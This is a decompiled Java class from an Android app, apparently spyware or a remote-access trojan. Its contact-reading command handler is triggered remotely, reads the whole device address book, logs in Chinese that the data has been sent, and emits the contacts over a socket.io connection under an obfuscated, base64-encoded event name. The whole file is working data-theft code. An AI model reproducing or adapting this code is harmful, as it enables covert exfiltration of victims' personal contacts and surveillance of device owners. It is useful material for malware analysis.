package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.client.transports.PollingXHR;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.C0856mc;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.SmsContactsCommandHandler$handleContactsRead$3", m214403f = "SmsContactsCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class SmsContactsCommandHandler$handleContactsRead$3 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0856mc f53524a1;

    /* renamed from: a2 */
    public final /* synthetic */ int f53525a2;

    /* renamed from: a3 */
    public final /* synthetic */ C0323a8 f53526a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public SmsContactsCommandHandler$handleContactsRead$3(C0856mc c0856mc, int i, C0323a8 c0323a8, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53524a1 = c0856mc;
        this.f53525a2 = i;
        this.f53526a3 = c0323a8;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new SmsContactsCommandHandler$handleContactsRead$3(this.f53524a1, this.f53525a2, this.f53526a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((SmsContactsCommandHandler$handleContactsRead$3) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8 = this.f53526a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            t60.m214714d6("SmsContactsCmdHandler", "正在读取通讯录数据");
            C0856mc c0856mc = this.f53524a1;
            JSONArray jSONArrayM213958a0 = c0856mc != null ? C0856mc.m213958a0(c0856mc, this.f53525a2) : new JSONArray();
            t60.m214714d6("SmsContactsCmdHandler", "读取完成，共 " + jSONArrayM213958a0.length() + " 个联系人");
            if (c0323a8 != null) {
                String strM212470a0 = StringUtil.m212470a0("KFYfLkw7GD1oNSpNEA==");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
                jSONObject.put("count", jSONArrayM213958a0.length());
                jSONObject.put("contacts", jSONArrayM213958a0);
                c0323a8.m211658c4(strM212470a0, jSONObject);
            }
            t60.m214714d6("SmsContactsCmdHandler", "通讯录数据已发送");
            return new Integer(0);
        } catch (Exception e) {
            tz0.m214808a8("读取通讯录异常: ", e.getMessage(), "SmsContactsCmdHandler", e);
            if (c0323a8 == null) {
                return null;
            }
            String strM212470a02 = StringUtil.m212470a0("KFYfLkw7GD1oNSpNEA==");
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, false);
            jSONObject2.put("error", "读取失败: " + e.getMessage());
            jSONObject2.put("count", 0);
            jSONObject2.put("contacts", new JSONArray());
            c0323a8.m211658c4(strM212470a02, jSONObject2);
            return C1351vv.f60710b1;
        }
    }
}
